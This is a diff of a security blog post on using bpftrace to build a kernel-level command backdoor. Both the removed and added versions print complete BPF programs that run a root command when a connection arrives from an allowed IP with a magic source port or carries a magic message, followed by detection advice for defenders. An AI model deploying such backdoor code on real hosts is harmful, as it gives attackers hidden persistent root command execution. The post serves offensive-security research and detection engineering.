@@ -3,7 +3,7 @@
 <head prefix="og: http://ogp.me/ns#">
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
-  <meta property="og:title" content=" Offensive BPF - Malicious deeds with bpftrace &middot;  Embrace The Red" />
+  <meta property="og:title" content=" Offensive BPF - Creating a simple command backdoor with bpftrace 🤯 &middot;  Embrace The Red" />
   
   <meta property="og:site_name" content="Embrace The Red" />
   <meta property="og:url" content="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/" />
@@ -11,7 +11,7 @@
   
   <meta property="og:type" content="article" />
   
-  <meta property="og:article:published_time" content="2021-10-01T08:00:58-07:00" />
+  <meta property="og:article:published_time" content="2021-10-05T08:00:58-07:00" />
   
   <meta property="og:article:tag" content="pentest" />
   
@@ -26,7 +26,7 @@
   
 
   <title>
-     Offensive BPF - Malicious deeds with bpftrace &middot;  Embrace The Red
+     Offensive BPF - Creating a simple command backdoor with bpftrace 🤯 &middot;  Embrace The Red
   </title>
 
   <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
@@ -42,7 +42,7 @@
   
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@wunderwuzzi23">
-<meta name="twitter:title" content="Offensive BPF - Malicious deeds with bpftrace">
+<meta name="twitter:title" content="Offensive BPF - Creating a simple backdoor with bpftrace 🤯">
 <meta name="twitter:description" content="Using eBPF in offensive security settings and mitigations">
 <meta name="twitter:image" content="https://embracethered.com/blog/images/2021/obpf.png">
 
@@ -111,13 +111,13 @@
 
 <article>
   <header>
-    <h1 class="text-primary">Offensive BPF - Malicious deeds with bpftrace</h1>
+    <h1 class="text-primary">Offensive BPF - Creating a simple command backdoor with bpftrace 🤯</h1>
     <div class="post-meta clearfix">
     
       <div class="post-date pull-left">
         Posted on
-        <time datetime="2021-10-01T08:00:58-07:00">
-          Oct 1, 2021
+        <time datetime="2021-10-05T08:00:58-07:00">
+          Oct 5, 2021
         </time>
       </div>
     
@@ -137,21 +137,24 @@
     </div>
   </header>
   <section>
-    <p><img src="/blog/images/2021/offensive-bpf.png" alt="Offensive BPF"></p>
-<p>This post is part of a series about <strong>Offensive BPF</strong> that I&rsquo;m working on to learn about BPF to understand attacks and defenses, click the <a href="/blog/tags/ebpf">&ldquo;ebpf&rdquo;</a> tag to see all relevant posts.</p>
+    <p>This post is part of a series about <strong>Offensive BPF</strong> that I&rsquo;m working on to learn about BPF to understand attacks and defenses, click the <a href="/blog/tags/ebpf">&ldquo;ebpf&rdquo;</a> tag to see all relevant posts.</p>
+<p>I&rsquo;m learning BPF to understand how its use will impact offensive security, malware, and detection engineering.</p>
+<p><img src="/blog/images/2021/offensive-bpf.png" alt="Offensive BPF"></p>
+<p>One offsec idea that quickly comes to mind with BPF is to observe network traffic and act upon specific events. So, I wanted to see if/how <code>bpftrace</code>, a popular tool for running BPF programs, can be used to create potential backdoors, and what evidence to look for as defenders.</p>
+<p>Let&rsquo;s get going.</p>
 <h1 id="what-is-bpftrace">What is bpftrace</h1>
 <p><code>bpftrace</code> is a versatile tool used to create custom bpf programs without having to deal with too many low-level things. The <a href="https://bpftrace.org/">bpftrace&rsquo;s homepage</a> calls it a &ldquo;High-level tracing language for Linux systems&rdquo;, and it has a cute logo.</p>
-<p>It’s kind of <strong>bpf Swiss army knife</strong>.</p>
-<p>My goal was to start at a higher level to learn BPF basics, grasp what is possible and where limitations are. <code>bpftrace</code> seems perfect for that. After building programs for a few days, I&rsquo;m really getting the hang of it.</p>
+<p>It’s kind of a <strong>BPF Swiss army knife</strong>.</p>
+<p>My goal was to start at a higher level to learn BPF basics, grasp what is possible and where limitations are. <code>bpftrace</code> seems perfect for that.</p>
 <p><img src="/blog/images/2021/pony.png" alt="Offensive BPF"></p>
-<p>Let&rsquo;s explore <code>bpftrace</code> in an offensive setting and how misuse can be detected.</p>
+<p>After building programs for a few days, I&rsquo;m really getting the hang of it.</p>
 <h2 id="installation">Installation</h2>
 <p>Performance and observability teams are pushing for tooling to be present in production. Due to its usefulness, this is likely going to increase.</p>
 <p>For experimenting with <code>bpftrace</code> on your own Linux box <a href="https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#ubuntu-packages">follow the instructions</a>.</p>
 <p><em>Note: I also upgraded my Ubuntu machine to 21.04 (Kernel 5.11) to have all the latest features and debugging capabilities available, which ended up making my life a bit easier in learning BPF. But things will also work on a bit older versions.</em></p>
 <h2 id="basic-example">Basic Example</h2>
 <p>Here is a basic &ldquo;hello world&rdquo; examples you see when learning about <code>bpftrace</code>:</p>
-<pre><code>sudo bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(&quot;Hello, World: %s %s\n&quot;, comm, str(args-&gt;filename)) }
+<pre><code>sudo bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(&quot;Hi! %s %s\n&quot;, comm, str(args-&gt;filename)) }
 </code></pre><p>Can you guess what this is doing?</p>
 <p>Let&rsquo;s look at the parameters:</p>
 <ol>
@@ -168,196 +171,127 @@
 </code></pre><p>Notice that this requires the use of the <code>--unsafe</code> command line option.</p>
 <p><strong>Detection Tip:</strong> Look for any unsafe bpftrace usage.</p>
 <p><strong>Caveat:</strong> The string passed in to <code>system()</code> has to be a string literal and can&rsquo;t be a variable. This makes writing a generic command execution backdoor a little less straight forward – have some ideas now how to improve this – will be a separate post down the road.</p>
-<h1 id="building-the-backdoor-using-bpftrace">Building the backdoor using bpftrace</h1>
+<h1 id="building-backdoors-with-bpftrace">Building backdoors with bpftrace</h1>
 <p>What can an adversary do? Let&rsquo;s dive into this a bit more.</p>
 <ol>
 <li>Assume an adversary gained privileged access to a host.</li>
 <li>The adversary installs a <code>bpf</code> based TCP backdoor.</li>
 <li>Now, whenever messages come from a certain IP (or source port) malicious commands are run</li>
-<li>It does not matter what TCP service (HTTP, SSH, MySQL&hellip;) the client/attacker uses to trigger the backdoor</li>
+<li><strong>The TCP service the client/attacker uses to trigger the command backdoor does not matter (HTTP, SSH, MySQL&hellip;)</strong> 🤯</li>
 </ol>
 <p>It sounded simple and took me many hours (close to 3 days on and off) to figure out the very basics to get this going.</p>
 <p>Let me share my learnings - this is also useful for anyone wanting to learn about BPF.</p>
-<h2 id="source-port-based-malware-trigger">Source port-based malware trigger</h2>
-<p>To keep it simple my first attempt was to use the source port information to awaken the <code>BPF</code> program.</p>
+<h2 id="first-solution-source-port-based-trigger">First solution: Source-port based trigger</h2>
+<p>To keep it simple, since initially this was about learning BPF for me, my first attempt was to use the combination of remote IP address and a magic source port number of a TCP connection to trigger the <code>BPF</code> program.</p>
 <p>Let&rsquo;s say a packet comes in on port <code>6666</code>, then the BPF program wakes up and does malicious stuff.</p>
-<p>Being quite motivated, I created a BPF program hooked up <code>kprope:tcp_connect</code> and added the following <code>if</code> clause:</p>
-<pre><code>if ( ((struct sock *) arg0)-&gt;__sk_common.skc_num == 6666) 
-{  
-    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/result.txt&quot;); 
-}
-</code></pre><p>When building more complex programs I found it better to store them in a file for easy editing. <code>bpftrace</code> programs typically have the <code>.bt</code> file extension.</p>
-<p>The very first solution I came up with looked looks like this:</p>
-<pre><code>#include &lt;net/sock.h&gt; 
-
-BEGIN 
-{ 
-    printf(&quot;Welcome to Offensive BPF!\n&quot;); 
-} 
-
-kprobe:tcp_connect 
-{ 
-    if ( ((struct sock *) arg0)-&gt;__sk_common.skc_num == 6666) 
-    { 
-        printf(&quot;backdoor call&quot;);
-        system(&quot;whoami &gt;&gt; /proc/1/root/tmp/result.txt&quot;); 
-    }
-}
-
-END
-{
-    printf(&quot;Exiting. Bye.\n&quot;);
-}
-</code></pre><p>To run the BPF program I used <code>sudo bpftrace --unsafe obpf.bt</code>.</p>
-<p>Indeed, this compiles and installs the BPF program into the kernel. Progress!</p>
-<p>Now let&rsquo;s walk through the details:</p>
-<ol>
-<li><code>BEGIN</code>/<code>END</code>: Code that is run before and after. Here we just print a welcome and exit message.</li>
-<li>Attach to <code>kprobe:tcp_connect</code> kernel probe. So, whenever a TCP connection happens this program will run</li>
-<li>Using <code>struct sock *</code> (from the imported header file) to read the source port</li>
-<li>Only if the source port is <code>6666</code> the <code>system</code> command will run and write the result to disk</li>
-</ol>
-<p>For testing, netcat (<code>nc</code>) allows you to specify the source port via the <code>-p</code> option, as follows:</p>
-<pre><code>nc -vv 192.168.0.12 8888 -p 6666
-</code></pre><p>I was excited when this worked on the server side and triggered the BPF program. Pretty cool!</p>
-<p>There was one problem though&hellip;</p>
-<p>This worked inside the local network but failed as soon as things traverse networks and NATs as source port can change.</p>
-<h1 id="building-a-message-based-trigger">Building a message-based trigger</h1>
-<p>What I really wanted is some kind of message-based trigger that runs when a &ldquo;secret backdoor message&rdquo; arrives on any port.</p>
-<p>This is where I started learning a lot&hellip;</p>
-<p>I spent time reading Linux source code and how TCP parsing works with <code>struct msghdr *</code> and related data structures. It&rsquo;s all a bit convoluted.</p>
-<p>Searching through hook points with <code>bpftrace</code> identified a point of interest.</p>
-<pre><code>$ sudo bpftrace -lv 'tracepoint:*enter_read' 
-BTF: using data from /sys/kernel/btf/vmlinux
-tracepoint:syscalls:sys_enter_read
-    int __syscall_nr;
-    unsigned int fd;
-    char * buf;
-    size_t count;
-</code></pre><p>About the command line options:</p>
-<ul>
-<li><code>-l</code>:  lists all the tracepoints, kprobes, uprobes that match provided string</li>
-<li><code>*</code>: Awesome: You can also use <code>*</code> as wildcards in the search</li>
-<li><code>-v</code>: shows data structures details (very useful). This didn&rsquo;t work before upgrading to a very recent Ubuntu version</li>
-</ul>
-<p>I wanted to read and print the <code>char * buf</code>. But when coding this, <code>sys_enter_read</code> gets called BUT that buffer is not yet filled with data - so how to access the data?</p>
-<h2 id="grasping-enter-and-exit-tracing-to-read-buffers">Grasping &ldquo;Enter&rdquo; and &ldquo;Exit&rdquo; tracing to read buffers</h2>
-<p>It took me a bit to grasp how enter and exit tracepoints work in unison to achieve the desired result.</p>
-<p>In retrospect it seems obvious, but for anyone starting this explanation should help:</p>
-<p>Exit tracepoints (e.g. <code>sys_exit_read</code>) don&rsquo;t have access to the arguments passed into the function.</p>
-<p>This puzzled me for a while&hellip;</p>
-<p>The way to handle this is to use the <code>sys_enter_read</code> hook <strong>to store a pointer to the buffer in a thread local variable</strong>. Then use the <code>sys_exit_read</code> hook <strong>to read that pointer</strong> again.</p>
-<p>In the exit hook the buffer (in this case <code>buf</code>) is filled with the data. The <code>sys_exit_*</code> functions have a <code>ret</code> value that tells you about the length of the buffer to read.</p>
-<p>After figuring that out, everything fell into place, and I made quick progress.</p>
-<p>Here is what this means in <code>bpftrace</code> code:</p>
-<pre><code>tracepoint:syscalls:sys_enter_read
-{ 
-     @sys_read[tid] = args-&gt;buf;
-}
-</code></pre><p>This stores the <code>buf</code> pointer in <code>@variable[tid]</code>. In this case I named the varialble <code>@sys_read</code>.</p>
-<p>Then in <code>sys_exit_read</code> the pointer is extracted, and we read the buffer as string.</p>
-<pre><code>tracepoint:syscalls:sys_exit_read
-/ @sys_read[tid] /   
-{ 
-  $cmd = str(@sys_read[tid], args-&gt;ret);
-  printf(&quot;&lt;-sys_exit_read(tid:%d): len: %d, buf: %s\n&quot;, tid, args-&gt;ret, $cmd);
-  
-  if ($cmd == &quot;OhhhBPF!\n&quot;)
-  {   
-    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
-  }
-
-  printf(&quot;&lt;-sys_exit_read(tdi:%d): Done.\n&quot;, tid);
-}
-</code></pre><p>If the content of the buffer (now in variable <code>$cmd</code>) contains the word &ldquo;<code>OhhhBPF!\n</code>&rdquo; the program will run a simple <code>whoami</code> and store the result in a file. Notice the file path, using that namespace is another thing that took me quite a while to figure out.</p>
-<h3 id="applying-a-filter">Applying a Filter</h3>
-<p>A new concept in this example is applying a <code>filter</code> by using <code>/ @sys_read[tid] /</code>. This filters only calls that are relevant. If you want to filter by a certain process name specify it like: <code>/ comm=&quot;nc&quot; /</code></p>
-<p>But that&rsquo;s it. At this point the program works as intended!</p>
-<h2 id="improvements-tracing-only-socket-reads">Improvements: Tracing only socket reads!</h2>
-<p>At that point reading buffers worked. It is noisy because all the <code>reads()</code> syscalls are traced, even though only socket connections are of interest.</p>
-<p>There is probably a better way to do this, but with the newly acquired <code>bcptrace</code> chops, I thought to:</p>
-<ul>
-<li>Hook the socket <code>accept</code> call via the <code>syscalls:sys_enter_accept4</code> trace point. I learned about by the correct method to trace (<code>accept4</code>) by observing the systems calls of a <code>netcat</code> server, by running: <code>strace nc -lkv 20000</code></li>
-<li>Add an IP address allow check to only allow a specific IP to cause the trigger</li>
-<li>Store the file descriptor <code>fd</code> during <code>accept</code> in <code>@sys_accept[tid]</code> - so we keep track of which <code>fd</code> came from a socket</li>
-<li>Update the <code>sys_enter_read</code> to ensure the read&rsquo;s file descriptor matches the one we stored</li>
-</ul>
-<p>This the resulting code:</p>
+<p>Using <code>sudo bpftrace -l 'kprobe:*accept*'</code> I explored available kprobes&hellip;</p>
+<p>Being quite motivated, I created a BPF program hooked up <code>kretprobe:inet_csk_accept</code> which is used for processing TCP connections.</p>
+<p>Sounds simple in retrospect but figuring this out took many hours (days?) of trying with various kprobes and tracepoints, failing, and learning I had a basic first solution.</p>
+<h3 id="the-implemenation">The implemenation</h3>
+<p>When building more complex programs I found it better to store them in a file for easy editing. <code>bpftrace</code> programs typically have the <code>.bt</code> file extension.</p>
+<p>To get started the <code>sock.h</code> is included, so the <code>socket</code> data structures are available.</p>
 <pre><code>#include &lt;net/sock.h&gt;
-
-BEGIN
+</code></pre><p>Next, I thought it&rsquo;s nice to have a little intro message for the program on command line:</p>
+<pre><code>BEGIN
 {
     printf(&quot;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&quot;);
+    printf(&quot;Allowed IP: %u (=&gt; %s). Magic Port: %u\n&quot;, $1, ntop(AF_INET, $1), $2);
 }
+</code></pre><p><code>$1</code> and <code>$2</code> are command line arguments passed in (&ldquo;allowed ip&rdquo; as integer and the &ldquo;magic port&rdquo;).</p>
+<p>Afterwards the probe implementation starts by defining the <code>kretprobe</code> that we want to listen to. There are always two corresponding probes/hooks one entry, and one exit (kret) probe by the way.</p>
+<pre><code>kretprobe:inet_csk_accept
+{
+</code></pre><p>Next, we grab the socket from the <code>kretprobe</code>, store it in <code>$sk</code> and also print out information about the remote ip that is connecting.</p>
+<pre><code>  $sk = (struct sock *) retval;
 
-tracepoint:syscalls:sys_enter_accept4 
-{ 
-  printf(&quot;-&gt;accept: Comm: %s, Allowed IP: %u&quot;, comm, $1 );
-
-  $sk4=(struct sockaddr_in  *) args-&gt;upeer_sockaddr; 
-  if ($sk4-&gt;sin_family == AF_INET) 
+  // only supporting IPv4
+  if ( $sk-&gt;__sk_common.skc_family == AF_INET ) 
   { 
-    $ip4 = $sk4-&gt;sin_addr;
-    if ($ip4 == 123456789) # whitelisted IP as int
+
+      printf(&quot;-&gt;%s: Checking RemoteAddr... %s (%u).\n&quot;, 
+        func,
+        ntop($sk-&gt;__sk_common.skc_daddr), 
+        $sk-&gt;__sk_common.skc_daddr); 
+</code></pre><p>Now comes the core logic of the program.</p>
+<p>First, we check if the remote IP is the one that is allowed to invoke the command.</p>
+<pre><code>    //is IP allowed?
+    if ($sk-&gt;__sk_common.skc_daddr == (uint32)$1)
     {
-      printf(&quot;-&gt;accept: *IPv4: fd:%d -- %s\n&quot;, args-&gt;fd, ntop($ip4) ); 
-      @sys_accept[tid] = args-&gt;fd;  
-    }
+      printf(&quot;-&gt;%s: IP check passed.\n&quot;, func);
+
+</code></pre><p>To understand the layout of the <code>struct sock *</code> and other I peeked at the Linux header files.</p>
+<p>If the IP check succeeds, we check if the connecting magic port matches also:</p>
+<pre><code>      $src_port_tmp = (uint16) $sk-&gt;__sk_common.skc_dport;
+      $loc_port     = $sk-&gt;__sk_common.skc_num; //for some reason need to read this other-wise source port is wrong!?
+      $src_port     = (( $src_port_tmp  &gt;&gt; 8) |  (( $src_port_tmp &lt;&lt; 8) &amp; 0x00FF00));
+
+      printf(&quot;-&gt;%s: Checking port: %d...\n&quot;, func, $src_port); 
+        
+      if ($src_port == (uint16) $2)
+      {
+        printf(&quot;-&gt;%s: Magic port check passed.\n&quot;, func); 
+</code></pre><p><em>Here is one thing that is a little awkward, the <code>skc_dport</code> needs to be converted from big endian - which make sense. But for some reason before doing that conversion we have to read the local port also (or access the sk struct)- otherwise the remote port information is wrong. This currently does not make sense to me and I&rsquo;m still trying to learn what&rsquo;s going on under the covers. Might be an bpftrace weirdness, not sure.</em></p>
+<p>Anyhow, if the connecting remote port matches the one, we look for, e.g. <code>6666</code>, then we run a <code>system</code> command.</p>
+<pre><code>         system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
+         printf(&quot;-&gt;%s: Command executed.\n&quot;, func);
+      }
+      else
+      { 
+        printf(&quot;-&gt;%s: Magic port check FAILED.\n&quot;, func); 
+      }
+    } 
   } 
 }
-
-tracepoint:syscalls:sys_enter_read
-{ 
-  //only trace inet fd's
-  if (args-&gt;fd == (uint64) @sys_accept[tid])
-  {
-     @sys_read[tid] = args-&gt;buf;
-  }   
-}
-
-tracepoint:syscalls:sys_exit_read
-/ @sys_read[tid] /   
-{ 
-  $cmd = str(@sys_read[tid], args-&gt;ret);
-  printf(&quot;&lt;-sys_exit_read(tid:%d): len: %d, buf: %s\n&quot;, tid, args-&gt;ret, $cmd);
-  
-  if ($cmd == &quot;OhhhBPF: whoami\n&quot;)
-  {   
-    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
-  }
- 
-  printf(&quot;&lt;-sys_exit_read(tdi:%d): Done.\n&quot;, tid);
-}
-
-END
+</code></pre><p><em>Note the way the BPF program accesses the file system via namespace in this case. Another one of these cases that took me hours to figure out</em></p>
+<p>Finally, a <code>bpftrace</code> program can also have an <code>END</code> function where you can clean up allocated data structures. We just say Bye:</p>
+<pre><code>END
 {
-    clear(@sys_read);
-    clear(@sys_accept);
-    printf(&quot;Exiting. Bye.\n&quot;);
+  printf(&quot;Exiting. Bye.\n&quot;);
 }
-</code></pre><p>After these changes the program works well, and without noise!</p>
-<h2 id="bpf-backdoor-in-action">BPF Backdoor in Action</h2>
-<p>After launching the BPF program on the compromised server, connecting to any port that is exposed on the server, and sending the &ldquo;magic string&rdquo; will run the backdoor program!</p>
-<p>Mind blown!</p>
-<p>In my final BPF program that will be used in Red Team Operations I added a couple more features to run more commands and exfiltrate files via a secure side channel - not publishing features now. Maybe in an upcoming post.</p>
-<h1 id="detections">Detections</h1>
-<p>There are a set of detection ideas for Blue Teams.</p>
+</code></pre><p>Indeed, this compiles and installs the BPF program into the kernel. Progress!</p>
+<h2 id="results">Results</h2>
+<p>To run the BPF program I used <code>sudo bpftrace --unsafe obpf.bt 1979820224 6666</code>.</p>
+<p>For testing, netcat (<code>nc</code>) allows you to specify the source port via the <code>-p</code> option, as follows:</p>
+<pre><code>nc -vv 192.168.0.118 22 -p 6666
+</code></pre><p>This is the result:</p>
+<p><img src="/blog/images/2021/obpf1.png" alt="Offensive BPF - bpftrace First"></p>
+<ol>
+<li>The two command line arguments are the integer of the allowed IP and the magic port which is the malicious trigger.</li>
+<li>A failed attempt with correct IP but an incorrect port</li>
+<li>A succesful launch of the backdoor command using the valid IP and the magic port number</li>
+</ol>
+<p>Checking the output file <code>/tmp/o</code> on the server the file was indeed created and the <code>whoami</code> result piped into:</p>
+<pre><code>$ sudo cat /tmp/o
+root
+</code></pre><p>It was exciting to see this work server side and trigger this proof-of-concept BPF program. Pretty cool!</p>
+<p>There are tremendous number of options to build on top of this now.</p>
+<h2 id="challenges">Challenges</h2>
+<ul>
+<li><code>bpftrace</code> is a bit limiting feature wise</li>
+<li>For instance, I couldn&rsquo;t find a function to convert IP Address to an integer. This is the reason the integer of the allowed IP has to be provided on the command line, rather than as easy readable IP Address. The reason is (yet another limitation) that I couldn&rsquo;t find a way to compare an <code>inet</code> struct with a <code>string</code>.</li>
+<li>As mentioned, reading the remote port, and assigning it to a variable had some weirdness, and showed inconsistent behaviors. It would be great if there would be built in functions to read/convert port information.</li>
+</ul>
+<p>In my final BPF program that will be used in Red Team Operations I added a couple more features to run more commands and exfiltrate files via a secure side channel - not publishing all features at this point. Maybe in the future when I have more things figured out, so definitely check out future posts.</p>
+<h1 id="detecting-bpf-misuse">Detecting BPF misuse</h1>
+<p>There are a set of detection ideas for Blue Teams, for now I have only explore the <code>bpftrace</code> angle, so there will likely be more recommendations down the road as I learn and understand eBPF better.</p>
 <h2 id="collecting-telemetry">Collecting Telemetry</h2>
 <p>Getting the telemetry around BPF syscalls is a crucial to getting insights into its usage across the fleet.</p>
 <h2 id="inspecting-loaded-bpf-programs">Inspecting loaded BPF programs</h2>
 <p>Loaded BPF programs can be inspected via the <code>bpftool</code>.</p>
-<p>For instance, <code>bpftool prog</code> will show you the details and you can see the malicious backdoor one-liner we used shows up:</p>
+<p>For instance, <code>bpftool prog</code> will show you the details and you can see the loaded programs:</p>
 <p><img src="/blog/images/2021/bpfprog.png" alt="BPF prog output"></p>
-<h2 id="--unsafe-bpftrace-usage-and-system-calls">&ndash;unsafe bpftrace usage and <code>system</code> calls</h2>
-<p>The usage of a <code>system()</code> call seems very unusual. So looking for command line logs that contain <code>bpftrace --unsafe</code> seems a good way to catch <strong>dangerous</strong> bpf programs also.</p>
+<h2 id="--unsafe-bpftrace-usage-and-system-calls"><code>--unsafe</code> bpftrace usage and <code>system()</code> calls</h2>
+<p>The usage of a <code>system()</code> call seems very unusual. So, looking for command line logs that contain <code>bpftrace --unsafe</code> seems a good way to catch <strong>dangerous</strong> bpf programs also.</p>
 <h2 id="persistence">Persistence</h2>
 <p>BPF programs don&rsquo;t survive a reboot, so an adversary will try to restart them (cron jobs, etc..). Be on the lookout!</p>
 <p><strong>There is also the attack avenue to backdoor existing programs that performance teams use or that are executed regularly on hosts.</strong>  I haven&rsquo;t seen any signature validation approaches yet, which could help detect such changes.</p>
-<h1 id="hooking-the-bpf-system-call-itself">Hooking the BPF system call itself!</h1>
+<h2 id="hooking-the-bpf-system-call-itself">Hooking the BPF system call itself!</h2>
 <p>A nifty attacker will likely hook the <code>bpf()</code> system call itself to change blue teams reality - this is something I want to explore in a future post.</p>
 <h1 id="conclusion">Conclusion</h1>
-<p>Hope this second post in the series was useful from a more technical perspective and gives some ideas on what defenders need to start looking out for. I&rsquo;m confident that BPF malware will be quite common in the not-so-distant future, so let’s get a step ahead.</p>
-<p>Twitter: <a href="https://twitter.com/wunderwuzzi23">@wunderwuzzi23</a></p>
+<p>Hope this second post in the series was useful from a more technical perspective and gives some ideas on what defenders need to start looking for.</p>
+<p><strong>I think BPF malware will be quite common in the not-so-distant future, so let’s get a step ahead with testing and building detections.</strong></p>
+<p>In the next post I want to continue exploring <code>bpftrace</code> to build a more complex, &ldquo;message based&rdquo; trigger system. The source port trigger is not really a solution to leverage for red team ops - it was more illustrative and a learning exercise for me.</p>
+<p>P.S.: Also, as always the reminder when building/testing new TTPs make sure to have proper authorization - don&rsquo;t do anything illegal or otherwise harmful.</p>
 <h1 id="resources">Resources</h1>
 <ul>
 <li><a href="https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html">BPF syscall</a></li>
